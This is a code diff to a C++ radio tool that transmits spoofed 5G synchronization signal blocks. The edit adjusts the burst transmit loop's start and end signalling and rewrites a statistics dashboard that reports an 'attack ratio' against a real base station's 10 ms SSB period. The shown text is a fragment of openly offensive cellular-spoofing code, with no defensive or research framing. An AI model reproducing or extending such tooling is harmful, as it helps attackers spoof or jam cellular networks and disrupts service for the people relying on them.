@@ -328,9 +328,12 @@ bool transmit_spoofed_ssb(RfHandler& rf, SsbProcessor& ssb_proc, const Config& c
       int frame = 0;
       
       while (running && (config.attack.max_bursts == 0 || tx_count < (int)config.attack.max_bursts)) {
-          // Transmit SSB continuously (no gaps)
-          int nsent = rf.transmit(tx_buffer.data(), nsamples, 
-                                 tx_count == 0, false);
+          // Determine if this is end of burst based on whether we'll have a delay
+          // If burst_interval > 0, we need to signal end_of_burst to prevent underruns
+          bool is_start = (tx_count == 0);
+          bool is_end = (config.attack.burst_interval_us > 0);
+          
+          int nsent = rf.transmit(tx_buffer.data(), nsamples, is_start, is_end);
           
           if (nsent < 0) {
               consecutive_errors++;
@@ -394,7 +397,8 @@ bool transmit_spoofed_ssb(RfHandler& rf, SsbProcessor& ssb_proc, const Config& c
       uint64_t total_samples    = (uint64_t)tx_count * nsamples;
       double samples_per_sec    = total_time_sec > 0 ? total_samples / total_time_sec : 0;
       double avg_burst_time_ms  = tx_count > 0 ? total_time_ms / (double)tx_count : 0;
-      double bursts_per_period  = (config.ssb.periodicity_ms / avg_burst_time_ms);
+      double actual_period_ms   = config.attack.burst_length_ms + (config.attack.burst_interval_us / 1000.0);
+      double bursts_per_10ms    = 10.0 / actual_period_ms;  // Compare to standard 10ms SSB period
       
       // Compact statistics dashboard
       std::cout << "\n\n  ======================================================================" << std::endl;
@@ -407,9 +411,9 @@ bool transmit_spoofed_ssb(RfHandler& rf, SsbProcessor& ssb_proc, const Config& c
                 << "  |  Throughput: "    << std::setw(8) << std::setprecision(0) << samples_per_sec << " samp/s" << std::endl;
       std::cout << "  Samples/Burst:   "  << std::setw(9) << nsamples 
                 << "  |  Burst Time: "    << std::setw(5) << std::setprecision(3) << avg_burst_time_ms << "ms"
-                << "  |  Period: "        << std::setw(4) << config.ssb.periodicity_ms << "ms" << std::endl;
-      std::cout << "  Attack Ratio:    "  << std::setw(6) << std::setprecision(1) << bursts_per_period 
-                << " : 1 (vs real gNB)"   << std::endl;
+                << "  |  Actual Period: " << std::setw(6) << std::setprecision(2) << actual_period_ms << "ms" << std::endl;
+      std::cout << "  Attack Ratio:    "  << std::setw(6) << std::setprecision(1) << bursts_per_10ms 
+                << " : 1 (vs standard 10ms SSB period)" << std::endl;
       std::cout <<     "  ======================================================================" << std::endl;
   } else {
       // Single transmission
